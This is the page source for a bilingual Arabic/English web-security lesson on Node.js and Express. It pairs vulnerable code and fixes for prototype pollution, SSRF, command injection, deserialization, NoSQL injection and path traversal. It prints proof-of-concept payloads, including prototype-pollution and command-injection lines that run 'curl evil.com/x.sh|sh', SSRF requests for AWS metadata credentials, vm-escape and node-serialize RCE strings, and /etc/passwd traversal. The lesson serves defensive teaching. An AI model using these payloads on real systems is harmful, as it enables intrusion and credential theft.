"use client";
import { LessonShell, Section, Callout, Code, Terminal, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="nodejs-express-security">
      <L
        ar={<>
          <Section title="ليه Node.js مختلف عن PHP/Java أمنياً؟">
            <p>إنت كاتب تطبيق Node. نفس الـ logic لو كاتبه في Java، آمن.</p>

            <p>- طب يعني نفس الكود؟ مش معقول!</p>

            <p>متوقّع يا مستجد. آه نفس الكود. السبب؟ JavaScript مش زي Java.</p>
            <Analogy>
              تخيّل بيت ذكي كل حيطانه بتتحرّك.
              مرونة جامدة، بس لو الزائر فهم إزاي يحرّكها، هيوصل لكل أوضة.
              Java زي مبنى أسمنت مسلّح — صعب تخش، صعب تبني فيه.
              Node مرن، سريع، حلو في الكتابة — وفيه فئات هجمات مش موجودة في Java أصلاً: prototype pollution، NoSQL injection، التلاعب بـ <span className="eng">require()</span>، deserialization عن طريق JSON عادي.
            </Analogy>
            <Callout kind="info" title="القصة: Lodash و 4 مليار download في الشهر">
              <span className="eng">lodash.merge</span> فيه prototype pollution — CVE-2019-10744. الـ npm بيـ download lodash 4 مليار مرة في الشهر.
              يعني نص الإنترنت كان vulnerable لـ payload واحد: <code>{`{"__proto__":{"isAdmin":true}}`}</code>.
              الـ patch طلع. تمام.
              بعد سنة، طلعت ثغرة مشابهة في <span className="eng">set-value</span>. وبعدها <span className="eng">hoek</span>. وبعدها <span className="eng">minimist</span>.
              نفس الـ class من الثغرات، شركات مختلفة، دروس ما اتعلمتش.
            </Callout>
            <Callout kind="danger" title="تحذير قانوني">
              أمثلة الاستغلال اللي جايّة كلها للتدريب في معملك أو pentest عليه إذن.
              تشغّلها على نظام إنتاج مش بتاعك = CFAA.
            </Callout>
          </Section>

          <Section title="Prototype Pollution — أم الثغرات في Node">
            <p>كل object في JS بيورّث من <span className="eng">Object.prototype</span>. المهاجم لو قدر يكتب property على الـ prototype ده، الـ property بتطلع على <b>كل object في الـ process</b>. النتايج بتتدرّج من DoS لحد RCE.</p>
            <Code lang="javascript">{`// كود ضعيف — merge عميق ساذج (مثل lodash.merge قبل الإصلاح)
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// المهاجم يرسل JSON
app.post('/api/profile', (req, res) => {
  merge({}, req.body);   // <-- !!
  res.send('ok');
});

// payload
{
  "__proto__": {
    "isAdmin": true,
    "shell": "/bin/sh -c 'curl evil.com|bash'"
  }
}

// بعد هذا، {} في أي مكان في التطبيق يحوي isAdmin === true`}</Code>
            <Callout kind="info" title="من DoS لحد RCE">
              <ul>
                <li><b>DoS</b> — تكتب <span className="eng">__proto__.toString = null</span> → أي <span className="eng">String(x)</span> هيقع.</li>
                <li><b>Auth bypass</b> — تكتب <span className="eng">isAdmin: true</span> → كل user object بيبقى admin.</li>
                <li><b>RCE</b> — لو التطبيق بيستخدم <span className="eng">child_process.spawn</span> مع <span className="eng">{`{shell: true}`}</span> والـ options جايّة من merge، تلوّث <span className="eng">__proto__.shell</span> وتتحكّم في الـ shell command.</li>
                <li><b>RCE عن طريق Express</b> — Express بينادي <span className="eng">res.render(view, locals)</span>. التلوّث على <span className="eng">__proto__.outputFunctionName</span> في bug مشهور بـ pug/handlebars بيدّيك RCE.</li>
              </ul>
            </Callout>
            <Code lang="javascript">{`// CVE-2019-10744 (lodash) — مثال PoC للـ RCE عبر pug
fetch('/api/profile', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    "__proto__": {
      "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').exec('curl evil.com/x.sh|sh')"
      }
    }
  })
});`}</Code>
            <Callout kind="good" title="الحماية">
              <ul>
                <li>استخدم <span className="eng">Object.create(null)</span> للـ maps اللي بتيجي من user input.</li>
                <li>افحص الـ keys: ارفض <span className="eng">__proto__</span>، <span className="eng">constructor</span>، <span className="eng">prototype</span>.</li>
                <li>استخدم <span className="eng">Map</span> بدل plain objects للـ user-keyed data.</li>
                <li>الـ flag <span className="eng">--disable-proto=delete</span> في Node 20+.</li>
                <li>حدّث lodash, jQuery, Hoek, set-value — كلها طلعلها CVEs.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="SSRF عبر axios / node-fetch / undici">
            <p>طلب HTTP من السيرفر لـ URL متحكّم فيه user = SSRF. وفي Node فيه فخّين: redirect handling تلقائي + DNS rebinding، الاتنين بيوصلوا cloud metadata.</p>
            <Code lang="javascript">{`// كود خطر
app.get('/fetch-image', async (req, res) => {
  const r = await axios.get(req.query.url, {responseType: 'stream'});
  r.data.pipe(res);
});

// PoC للوصول لـ AWS IMDS من خلال عدم فحص hostname
GET /fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

// أو DNS rebinding — يخدم 1.1.1.1 ثم يتغيّر للـ 169.254.169.254
GET /fetch-image?url=http://rebind.evil.com/latest/...

// أو URL parser confusion (Node URL vs WHATWG URL)
GET /fetch-image?url=http://attacker.com#@169.254.169.254/`}</Code>
            <Code lang="javascript">{`// الحماية — allowlist + IP literal check + DNS resolve يدوي
import dns from 'dns/promises';
import ipaddr from 'ipaddr.js';

async function safeFetch(url) {
  const u = new URL(url);
  if (!['http:', 'https:'].includes(u.protocol)) throw new Error('proto');
  const addrs = await dns.resolve(u.hostname);
  for (const a of addrs) {
    const range = ipaddr.parse(a).range();
    if (range !== 'unicast') throw new Error('private/special IP');
    if (a.startsWith('169.254.') || a.startsWith('127.') || a.startsWith('10.')) throw new Error('blocked');
  }
  // Pin DNS — احكم على الـ IP و مرّره مباشرة
  return axios.get(url, { lookup: (h, opts, cb) => cb(null, addrs[0], 4) });
}`}</Code>
          </Section>

          <Section title="Command Injection عبر child_process">
            <Code lang="javascript">{`// خطر — exec مع user input
const { exec } = require('child_process');
app.get('/ping', (req, res) => {
  exec(\`ping -c 4 \${req.query.host}\`, (err, out) => res.send(out));
});

// PoC
GET /ping?host=8.8.8.8;curl%20evil.com/x.sh|sh

// أيضاً خطر — execFile مع shell:true
execFile('sh', ['-c', \`echo \${req.query.x}\`]);   // injection

// آمن — execFile بدون shell + arguments array
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', '--', host], (err, out) => ...);
// لاحظ '--' لمنع flag injection`}</Code>
            <Callout kind="info" title="فخ شائع">
              <span className="eng">{`spawn(cmd, args, {shell: true})`}</span> بيرجّعلك الـ injection تاني. القاعدة: <b>shell: false دايماً</b> + <b>args array</b> + <b>--</b> عشان تقطع flags.
            </Callout>
          </Section>

          <Section title="Deserialization عبر JSON و serialize-javascript">
            <p>JSON.parse آمن. بس مكتبات تانية بتنفّذ كود فعلاً:</p>
            <ul>
              <li><span className="eng">node-serialize</span> — <span className="eng">unserialize()</span> بيقبل markers زي <span className="eng">_$$ND_FUNC$$_</span> وبينفّذ JS. متهجور بس لسه موجود في أنظمة كتير.</li>
              <li><span className="eng">js-yaml</span> — <span className="eng">yaml.load()</span> القديم بيدعم <span className="eng">!!js/function</span>. استخدم <span className="eng">yaml.safeLoad</span> أو <span className="eng">load(s, {`{schema: FAILSAFE_SCHEMA}`})</span>.</li>
              <li><span className="eng">serialize-javascript</span> CVE-2020-7660 — XSS من regex.</li>
              <li><span className="eng">vm</span> module — <b>مش sandbox</b>. <span className="eng">this.constructor.constructor("return process")()</span> بيهرب منه.</li>
            </ul>
            <Code lang="javascript">{`// node-serialize PoC
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', (e,o)=>console.log(o))}()"}

// vm escape
const vm = require('vm');
const sandbox = {};
vm.runInNewContext(\`this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()\`, sandbox);
// → uid=0(root)

// آمن — استخدم isolated-vm إن احتجت sandbox فعلي
const ivm = require('isolated-vm');
const isolate = new ivm.Isolate({memoryLimit: 8});`}</Code>
          </Section>

          <Section title="NoSQL Injection — MongoDB">
            <Code lang="javascript">{`// خطر — body parsed يحوي operators
app.post('/login', async (req, res) => {
  const user = await User.findOne({ name: req.body.name, pass: req.body.pass });
  if (user) res.send('ok');
});

// المهاجم يرسل JSON
{"name": "admin", "pass": {"$ne": null}}
// $ne null = أي pass != null = bypass

// أخطر
{"name": {"$gt": ""}, "pass": {"$gt": ""}}   // أول user

// JS injection في $where
{"$where": "this.name == 'admin' && sleep(5000)"}   // blind oracle

// الحماية
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize({ replaceWith: '_' }));

// أو schema strict
const user = await User.findOne({
  name: String(req.body.name),
  pass: String(req.body.pass)
});`}</Code>
          </Section>

          <Section title="Path Traversal و File Disclosure">
            <Code lang="javascript">{`// خطر
app.get('/files/:name', (req, res) => {
  res.sendFile(path.join(__dirname, 'uploads', req.params.name));
});

// PoC
GET /files/..%2f..%2f..%2fetc%2fpasswd
GET /files/..%252f..%252f   # double-encode إذا كان هناك decode مرتين

// عبر symlinks
GET /files/symlink_to_root

// الحماية
const safe = path.normalize(req.params.name).replace(/^(\\.\\.[\\/\\\\])+/, '');
const full = path.join(__dirname, 'uploads', safe);
if (!full.startsWith(path.resolve(__dirname, 'uploads') + path.sep)) {
  return res.status(403).end();
}
// + fs.realpath لكشف symlinks
const real = await fs.promises.realpath(full);
if (!real.startsWith(uploadsRoot)) return res.status(403).end();`}</Code>
          </Section>

          <Section title="Express-specific traps">
            <ul>
              <li><b>express.static + viewEngine</b> — لو الـ static prefix بيوصل لمجلد الـ templates، فيه تلاعب ممكن.</li>
              <li><b>req.query parsing</b> — Express بيستخدم <span className="eng">qs</span> اللي بيدعم arrays و nested objects: <span className="eng">?a[]=1&a[]=2</span>. كود بيفترض string هيتكسر.</li>
              <li><b>HPP (HTTP Parameter Pollution)</b> — <span className="eng">?id=1&id=2</span> بيبقى array. استخدم middleware <span className="eng">hpp</span>.</li>
              <li><b>Trust proxy misconfig</b> — <span className="eng">app.set('trust proxy', true)</span> الكامل بيخلّي المهاجم يزوّر <span className="eng">X-Forwarded-For</span> ويعدّي rate limits / IP allowlists.</li>
              <li><b>Open redirect</b> — <span className="eng">res.redirect(req.query.next)</span> من غير فحص. قفّل على paths نسبية بس.</li>
              <li><b>Body size</b> — مفيش حد افتراضي على JSON body كبير في بعض الإعدادات. حط <span className="eng">{`express.json({ limit: '100kb' })`}</span>.</li>
            </ul>
          </Section>

          <Section title="Supply chain — npm كسلاح">
            <ul>
              <li><b>Typosquatting</b> — <span className="eng">expresss</span>, <span className="eng">colorss</span>, <span className="eng">crossenv</span>.</li>
              <li><b>Dependency confusion</b> — حزمة عامة بنفس اسم حزمة داخلية عندك.</li>
              <li><b>Compromised maintainer</b> — event-stream (2018), ua-parser-js (2021), node-ipc (2022 protestware).</li>
              <li><b>postinstall scripts</b> — بتشتغل لوحدها مع <span className="eng">npm install</span>. خصوصاً على CI.</li>
            </ul>
            <Code lang="bash">{`# الحماية
npm config set ignore-scripts true            # امنع postinstall افتراضياً
npm install --ignore-scripts <pkg>
npm audit && npm audit fix
npm ls --all                                  # شجرة كاملة
npx better-npm-audit                          # تجاهل CVEs بـ justification

# Lockfile lint
npx lockfile-lint --type npm --path package-lock.json \\
  --validate-https --allowed-hosts npm

# Socket.dev / Snyk / GitHub Dependabot
# Sigstore + npm provenance — توقيع الحزم رسمياً (npm publish --provenance)`}</Code>
          </Section>

          <Section title="تحصين Express — قائمة عملية">
            <Code lang="javascript">{`import express from 'express';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import mongoSanitize from 'express-mongo-sanitize';
import hpp from 'hpp';

const app = express();
app.disable('x-powered-by');                     // لا تكشف Express
app.set('trust proxy', 1);                       // فقط reverse proxy واحد
app.use(helmet());                               // CSP/HSTS/XSS-Protection
app.use(express.json({ limit: '100kb' }));
app.use(mongoSanitize({ replaceWith: '_' }));
app.use(hpp());
app.use(rateLimit({ windowMs: 60_000, max: 100 }));

// CSP صارم
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{{nonce}}'"],   // لا 'unsafe-inline'
    objectSrc: ["'none'"],
    frameAncestors: ["'none'"],
    upgradeInsecureRequests: []
  }
}));

// Cookie آمنة
app.use(session({
  secret: process.env.SECRET,
  cookie: { httpOnly: true, secure: true, sameSite: 'strict' }
}));`}</Code>
          </Section>

          <Section title="أدوات الفحص">
            <ul>
              <li><b>npm audit / pnpm audit</b> — أول خط دفاع.</li>
              <li><b>Semgrep</b> مع ruleset <span className="eng">p/javascript</span> و <span className="eng">p/nodejs</span> — بيصطاد eval, child_process, prototype pollution sinks.</li>
              <li><b>CodeQL</b> — تحليل أعمق، فيه query suite كامل للـ JS.</li>
              <li><b>NodeJsScan</b> — فحص ثابت سريع.</li>
              <li><b>Burp Suite</b> + extension <span className="eng">prototype-pollution-finder</span>.</li>
              <li><b>OWASP ZAP</b> + active scanner للـ NoSQLi.</li>
            </ul>
          </Section>

          <Section title="غلطات الـ junior في Node">
            <Callout kind="danger" title="اللي بيكلّفك breach">
              <ul>
                <li><b>"merge بسيط، إيه المشكلة"</b> — أي recursive merge من user input من غير فلترة على <span className="eng">__proto__</span> = ثغرة. حتى لو الـ codebase صغير.</li>
                <li><b>npm install أي حاجة</b> — left-pad اتمسحت مرة وكسرت نص الإنترنت. <span className="eng">event-stream</span> اتعملها supply chain attack وسرقت Bitcoin wallets. قبل ما تـ install package، اتفرّج على المؤلف، الـ downloads، آخر commit.</li>
                <li><b>JWT بـ HS256 والـ secret في .env</b> — ثم الـ .env بيتكوميت بالغلط. اتسرّب 1000 مرة في 1000 شركة. استخدم RS256 + KMS.</li>
                <li><b>eval() على JSON</b> — لسه فيه ناس بتعمل كده في 2026. <span className="eng">JSON.parse</span> موجود من زمان.</li>
                <li><b>child_process.exec بـ string</b> — بدل spawn بـ array. الفرق: shell injection vs آمن.</li>
                <li><b>"helmet مش هيعمل فرق"</b> — helmet في 5 سطور بيقفلك 8 classes من الهجمات. مش feature، ضرورة.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="الخلاصة الناشفة">
            <p>Node سريع وحلو. وبيدّيك مساحة تغلط 1000 غلطة قبل ما تخش production.</p>
            <p>اكتبها على ظهر إيدك:</p>
            <p>الفرق بين Node آمن و Node مكشوف = 5 packages: helmet، express-rate-limit، joi/zod، express-mongo-sanitize، و npm audit في الـ CI.</p>
            <p>اللي مش بيستخدمهم؟ بيختبر الـ exploits على إنتاجه. وأنت ونصيبك.</p>
          </Section>
        </>}
        en={<>
          <Section title="Why Node.js is different from PHP/Java security-wise">
            <p>Node.js runs JavaScript on the server. JavaScript is <b>extremely dynamic</b> — every object is mutable, every property overrideable. That opens attack classes that don't exist in Java or Go: prototype pollution, NoSQL injection, <span className="eng">require()</span> tampering, JSON-shaped deserialization.</p>
            <Analogy>A smart house where every wall moves. Great flexibility — but if a visitor learns how to slide the walls, they reach every room. Java is concrete: harder to break, harder to build.</Analogy>
            <Callout kind="danger" title="Legal warning">
              All exploit examples are for your own lab or an authorized pentest. Running them against systems you don't own is a CFAA crime.
            </Callout>
          </Section>

          <Section title="Prototype Pollution — Node's flagship vuln">
            <p>Every JS object inherits from <span className="eng">Object.prototype</span>. If an attacker can write a property onto that prototype, it appears on <b>every object in the process</b>. Outcomes range from DoS to RCE.</p>
            <Code lang="javascript">{`// Vulnerable — naive deep merge (like pre-fix lodash.merge)
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

app.post('/api/profile', (req, res) => {
  merge({}, req.body);   // <-- !!
  res.send('ok');
});

// payload
{
  "__proto__": {
    "isAdmin": true,
    "shell": "/bin/sh -c 'curl evil.com|bash'"
  }
}

// After this, every {} in the app has isAdmin === true`}</Code>
            <Callout kind="info" title="From DoS to RCE">
              <ul>
                <li><b>DoS</b> — set <span className="eng">__proto__.toString = null</span> → every <span className="eng">String(x)</span> crashes.</li>
                <li><b>Auth bypass</b> — set <span className="eng">isAdmin: true</span> → every user object becomes admin.</li>
                <li><b>RCE</b> — if the app uses <span className="eng">child_process.spawn</span> with <span className="eng">{`{shell: true}`}</span> and the options object came from merge, <span className="eng">__proto__.shell</span> hijacks the shell binary.</li>
                <li><b>RCE via Express</b> — Express calls <span className="eng">res.render(view, locals)</span>. Polluting <span className="eng">__proto__.outputFunctionName</span> in the well-known pug/handlebars chain yields RCE.</li>
              </ul>
            </Callout>
            <Code lang="javascript">{`// CVE-2019-10744 (lodash) — RCE PoC via pug template
fetch('/api/profile', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    "__proto__": {
      "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').exec('curl evil.com/x.sh|sh')"
      }
    }
  })
});`}</Code>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Use <span className="eng">Object.create(null)</span> for user-keyed maps.</li>
                <li>Reject keys: <span className="eng">__proto__</span>, <span className="eng">constructor</span>, <span className="eng">prototype</span>.</li>
                <li>Use <span className="eng">Map</span> instead of plain objects for user-keyed data.</li>
                <li><span className="eng">--disable-proto=delete</span> flag in Node 20+.</li>
                <li>Update lodash, jQuery, Hoek, set-value — all had CVEs.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="SSRF via axios / node-fetch / undici">
            <p>Server-side HTTP to a user-controlled URL = SSRF. Two Node-specific dangers: automatic redirect following + DNS rebinding can reach cloud metadata.</p>
            <Code lang="javascript">{`// Vulnerable
app.get('/fetch-image', async (req, res) => {
  const r = await axios.get(req.query.url, {responseType: 'stream'});
  r.data.pipe(res);
});

// PoC: AWS IMDS via no hostname check
GET /fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

// Or DNS rebinding — serves 1.1.1.1 then flips to 169.254.169.254
GET /fetch-image?url=http://rebind.evil.com/latest/...

// URL parser confusion (Node URL vs WHATWG URL)
GET /fetch-image?url=http://attacker.com#@169.254.169.254/`}</Code>
            <Code lang="javascript">{`// Defense — allowlist + IP literal check + manual DNS resolve
import dns from 'dns/promises';
import ipaddr from 'ipaddr.js';

async function safeFetch(url) {
  const u = new URL(url);
  if (!['http:', 'https:'].includes(u.protocol)) throw new Error('proto');
  const addrs = await dns.resolve(u.hostname);
  for (const a of addrs) {
    const range = ipaddr.parse(a).range();
    if (range !== 'unicast') throw new Error('private/special IP');
    if (a.startsWith('169.254.') || a.startsWith('127.') || a.startsWith('10.')) throw new Error('blocked');
  }
  // Pin DNS — judge IP, then pass it through
  return axios.get(url, { lookup: (h, opts, cb) => cb(null, addrs[0], 4) });
}`}</Code>
          </Section>

          <Section title="Command injection via child_process">
            <Code lang="javascript">{`// Vulnerable — exec with user input
const { exec } = require('child_process');
app.get('/ping', (req, res) => {
  exec(\`ping -c 4 \${req.query.host}\`, (err, out) => res.send(out));
});

// PoC
GET /ping?host=8.8.8.8;curl%20evil.com/x.sh|sh

// Also dangerous — execFile with shell:true
execFile('sh', ['-c', \`echo \${req.query.x}\`]);   // injection

// Safe — execFile without shell + args array
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', '--', host], (err, out) => ...);
// Note '--' to stop flag injection`}</Code>
            <Callout kind="info" title="Common trap">
              <span className="eng">{`spawn(cmd, args, {shell: true})`}</span> reintroduces injection. Rule: <b>shell: false always</b> + <b>args array</b> + <b>--</b> to terminate flags.
            </Callout>
          </Section>

          <Section title="Deserialization via JSON & serialize-javascript">
            <p>JSON.parse is safe. Other libraries execute code:</p>
            <ul>
              <li><span className="eng">node-serialize</span> — <span className="eng">unserialize()</span> accepts <span className="eng">_$$ND_FUNC$$_</span> markers and runs JS. Abandoned but still in many systems.</li>
              <li><span className="eng">js-yaml</span> — old <span className="eng">yaml.load()</span> supports <span className="eng">!!js/function</span>. Use <span className="eng">yaml.safeLoad</span> or <span className="eng">load(s, {`{schema: FAILSAFE_SCHEMA}`})</span>.</li>
              <li><span className="eng">serialize-javascript</span> CVE-2020-7660 — XSS via regex.</li>
              <li><span className="eng">vm</span> module — <b>not a sandbox</b>. <span className="eng">this.constructor.constructor("return process")()</span> escapes.</li>
            </ul>
            <Code lang="javascript">{`// node-serialize PoC
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', (e,o)=>console.log(o))}()"}

// vm escape
const vm = require('vm');
const sandbox = {};
vm.runInNewContext(\`this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()\`, sandbox);
// → uid=0(root)

// Safe — use isolated-vm if you need real sandboxing
const ivm = require('isolated-vm');
const isolate = new ivm.Isolate({memoryLimit: 8});`}</Code>
          </Section>

          <Section title="NoSQL injection — MongoDB">
            <Code lang="javascript">{`// Vulnerable — parsed body carries operators
app.post('/login', async (req, res) => {
  const user = await User.findOne({ name: req.body.name, pass: req.body.pass });
  if (user) res.send('ok');
});

// Attacker JSON
{"name": "admin", "pass": {"$ne": null}}
// $ne null = any pass != null = bypass

// Worse
{"name": {"$gt": ""}, "pass": {"$gt": ""}}   // first user

// JS injection via $where
{"$where": "this.name == 'admin' && sleep(5000)"}   // blind oracle

// Defense
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize({ replaceWith: '_' }));

// Or strict types
const user = await User.findOne({
  name: String(req.body.name),
  pass: String(req.body.pass)
});`}</Code>
          </Section>

          <Section title="Path traversal & file disclosure">
            <Code lang="javascript">{`// Vulnerable
app.get('/files/:name', (req, res) => {
  res.sendFile(path.join(__dirname, 'uploads', req.params.name));
});

// PoC
GET /files/..%2f..%2f..%2fetc%2fpasswd
GET /files/..%252f..%252f   # double-encode if decoded twice

// Via symlinks
GET /files/symlink_to_root

// Defense
const safe = path.normalize(req.params.name).replace(/^(\\.\\.[\\/\\\\])+/, '');
const full = path.join(__dirname, 'uploads', safe);
if (!full.startsWith(path.resolve(__dirname, 'uploads') + path.sep)) {
  return res.status(403).end();
}
// + fs.realpath to defeat symlinks
const real = await fs.promises.realpath(full);
if (!real.startsWith(uploadsRoot)) return res.status(403).end();`}</Code>
          </Section>

          <Section title="Express-specific traps">
            <ul>
              <li><b>express.static + view engine</b> — if the static prefix can reach the templates folder, tampering is possible.</li>
              <li><b>req.query parsing</b> — Express uses <span className="eng">qs</span>, which supports arrays and nested objects: <span className="eng">?a[]=1&a[]=2</span>. Code expecting a string can break.</li>
              <li><b>HPP (HTTP Parameter Pollution)</b> — <span className="eng">?id=1&id=2</span> becomes an array. Use the <span className="eng">hpp</span> middleware.</li>
              <li><b>Trust proxy misconfig</b> — full <span className="eng">app.set('trust proxy', true)</span> lets attackers forge <span className="eng">X-Forwarded-For</span> and bypass rate limits / IP allowlists.</li>
              <li><b>Open redirect</b> — <span className="eng">res.redirect(req.query.next)</span> without checking. Restrict to relative paths.</li>
              <li><b>Body size</b> — no default cap on huge JSON bodies in some configs. Set <span className="eng">{`express.json({ limit: '100kb' })`}</span>.</li>
            </ul>
          </Section>

          <Section title="Supply chain — npm as a weapon">
            <ul>
              <li><b>Typosquatting</b> — <span className="eng">expresss</span>, <span className="eng">colorss</span>, <span className="eng">crossenv</span>.</li>
              <li><b>Dependency confusion</b> — public package matching a private internal name.</li>
              <li><b>Compromised maintainer</b> — event-stream (2018), ua-parser-js (2021), node-ipc (2022 protestware).</li>
              <li><b>postinstall scripts</b> — run automatically on <span className="eng">npm install</span>. Especially on CI.</li>
            </ul>
            <Code lang="bash">{`# Defense
npm config set ignore-scripts true            # disable postinstall by default
npm install --ignore-scripts <pkg>
npm audit && npm audit fix
npm ls --all                                  # full tree
npx better-npm-audit                          # justify ignored CVEs

# Lockfile lint
npx lockfile-lint --type npm --path package-lock.json \\
  --validate-https --allowed-hosts npm

# Socket.dev / Snyk / GitHub Dependabot
# Sigstore + npm provenance — formally signed packages (npm publish --provenance)`}</Code>
          </Section>

          <Section title="Hardening Express — practical checklist">
            <Code lang="javascript">{`import express from 'express';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import mongoSanitize from 'express-mongo-sanitize';
import hpp from 'hpp';

const app = express();
app.disable('x-powered-by');                     // don't leak Express
app.set('trust proxy', 1);                       // exactly one upstream proxy
app.use(helmet());                               // CSP/HSTS/XSS-Protection
app.use(express.json({ limit: '100kb' }));
app.use(mongoSanitize({ replaceWith: '_' }));
app.use(hpp());
app.use(rateLimit({ windowMs: 60_000, max: 100 }));

// Strict CSP
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{{nonce}}'"],   // no 'unsafe-inline'
    objectSrc: ["'none'"],
    frameAncestors: ["'none'"],
    upgradeInsecureRequests: []
  }
}));

// Secure cookies
app.use(session({
  secret: process.env.SECRET,
  cookie: { httpOnly: true, secure: true, sameSite: 'strict' }
}));`}</Code>
          </Section>

          <Section title="Scanning tools">
            <ul>
              <li><b>npm audit / pnpm audit</b> — first line.</li>
              <li><b>Semgrep</b> with <span className="eng">p/javascript</span> and <span className="eng">p/nodejs</span> — finds eval, child_process, prototype pollution sinks.</li>
              <li><b>CodeQL</b> — deeper analysis, JS query suite.</li>
              <li><b>NodeJsScan</b> — fast static scan.</li>
              <li><b>Burp Suite</b> + <span className="eng">prototype-pollution-finder</span> extension.</li>
              <li><b>OWASP ZAP</b> + active NoSQLi scanner.</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
